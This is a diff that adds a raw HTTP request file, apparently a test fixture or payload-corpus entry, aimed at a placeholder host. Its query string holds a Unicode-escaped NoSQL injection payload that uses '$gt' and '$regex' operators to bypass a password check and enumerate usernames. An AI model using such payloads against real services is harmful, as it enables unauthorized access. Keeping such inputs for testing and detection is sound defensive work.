@@ -1,0 +1,4 @@
+GET /a?id={\u0022password\u0022:{\u0022$gt\u0022:\u0022\u0022},\u0022user\u0022:{\u0022$regex\u0022:\u0022^a\u0022}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
